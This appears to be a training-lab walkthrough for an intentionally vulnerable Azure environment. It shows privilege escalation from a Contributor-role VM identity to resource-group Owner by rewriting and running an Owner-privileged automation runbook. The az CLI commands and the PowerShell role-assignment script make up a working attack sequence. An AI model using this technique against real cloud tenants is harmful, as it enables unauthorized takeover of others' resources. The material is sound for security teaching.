# Objective

Leverage the misconfiguration and escalate privilege to the owner of the resource group.

# Solution

We will have a virtual machine with a contributor role assigned and also an automation account runbook with an owner role assigned. SSH into the VM and list the resources inside the resource group and find the runbook inside the automation account. Update the runbook code with the code to change the virtual machine contributor role to the owner. Thus privilege escalation can be done.

**Step 1:** Login to the virtual machine using the credentials obtained from the config.txt file.

Provide the write permission to the justin.pem file and login to the virtual machine.

```
chmod +600 justin.pem

ssh -i justin.pem justin@40.85.170.40
```

![](https://user-images.githubusercontent.com/65826354/183737316-807e8ff3-cfe8-4cc3-a4db-9e260dea3eb1.png)

**Step 2:** Execute the command "az login" and check whether we can interact with the resources or not.

```
az login -i
```

![](https://user-images.githubusercontent.com/65826354/183737322-916d1d8e-b8f6-4e6e-8e84-e3fcd7758acf.png)

**Step 3:** List the resources using the following command.

```
az resource list
```

![](https://user-images.githubusercontent.com/42687376/223097171-4e5a4842-f720-4ab9-be57-7ac8febacd08.png)

In the output, locate the Virtual Machine name and principal ID.

![](https://user-images.githubusercontent.com/42687376/223097139-e22d6c72-4d19-490d-ab77-e8cb77cc37f0.png)

The Virtual Machine name and principal ID were retrieved successfully.

**Step 4:** Check the level of access given to our Virtual Machine.

```
az role assignment list -g azuregoat_app
```

**Note:** If your resource group has a different name, make sure to replace "azuregoat_app" with the actual name of your resource group to ensure that the commands are executed on the correct resource group.

Now, check the level of access given to our Virtual Machine.

Match the principal id of our VM's identity with the role assignments.

![](https://user-images.githubusercontent.com/42687376/223097148-6b15b0a5-94de-4622-b607-ffccc238e919.png)

We have a contributor role assigned. We can not perform role assignment operations to escalate our privileges.

**Step 5:** Check the list of resources to find out which resource is associated with the owner-level identity.

In the list of role assignments, we have an Owner role, we will try to map its principalID with the principalID for one of the resources.

![](https://user-images.githubusercontent.com/42687376/223097150-5886c2d7-5b7c-48c8-a30c-f5529ec8eb49.png)

To correlate this with the principal ID of the resources, you may run the following command again.

```
az resource list
```

![](https://user-images.githubusercontent.com/42687376/223097152-a30a38cd-7d86-429b-9581-15118bb8c799.png)

We found an automation account with Owner privileges. 

**Step 6:** Check for the runbooks to perform privileges escalation.

```
az automation runbook list --automation-account-name <Automation-account-name> -g azuregoat_app 
```

**Note:** Substitute the name of the automation account with the name of the automation account obtained by listing and matching the principal ID of the resource and also if your resource group has a different name, make sure to replace "azuregoat_app" with the actual name of your resource group to ensure that the commands are executed on the correct resource group.

![](https://user-images.githubusercontent.com/65826354/183737366-32394666-7473-4d38-a266-817cf66c0a68.png)

We found a PowerShellWorkFlow based runbook.

**Step 7:** Create a PowerShell script to elevate privileges.

This code will assign the **Owner** role to the Virtual Machine.

```
workflow Get-AzureVM {
    inlineScript {
        Disable-AzContextAutosave -Scope Process
        $AzureContext = (Connect-Azaccount -Identity -AccountId <Identity-Client-ID>).context
        $AzureContext = Set-AzContext -SubscriptionName $AzureContext.Subscription -DefaultProfile $AzureContext
        New-AzRoleAssignment -RoleDefinitionName "Owner" -ObjectId <VM-Object-ID> -resourceGroupName <ResourceGroup Name>
    }
}
```
Please update the following placeholders with the appropriate values:
- Replace `<Identity-Client-ID>` with the Client ID of your Automation Account.
- Replace `<VM-Object-ID>` with the Principal ID of your Virtual Machine.
- Replace `<ResourceGroup Name>` with the name of your Resource Group.

![](https://github.com/user-attachments/assets/de0b1df4-6153-4392-997b-a450f872cb9e)

**Step 8:** Replace, publish and re-start the runbook.

We will replace the content inside the azure runbook, publish it and start it to execute the role assignment code.

```
az automation runbook replace-content --automation-account-name "dev-automation-account-test" --resource-group <ResourceGroup Name> --name "Get-AzureVM" --content @exploit.ps1

az automation runbook publish --automation-account-name "dev-automation-account-test" --resource-group <ResourceGroup Name> --name "Get-AzureVM"

az automation runbook start --automation-account-name "dev-automation-account-test" --resource-group <ResourceGroup Name> --name "Get-AzureVM"
```

![](https://user-images.githubusercontent.com/42687376/223097162-b837d122-b0fc-4607-bf59-e2bb36652c51.png)

**Step 9:** Check the role assignment list.

```
az role assignment list -g azuregoat_app
```

**Note:** It may take some time to switch from "Contributor" to "Owner" by using the Runbook. If your resource group has a different name, make sure to replace "azuregoat_app" with the actual name of your resource group

Find our VM using the Principal ID.

![](https://user-images.githubusercontent.com/42687376/223097167-3559a180-3a9e-4257-a592-ef4a6f7563da.png)

The role got changed from contributor to owner.

***Congrats! We successfully escalated the privileges to the owner of the resource group.***
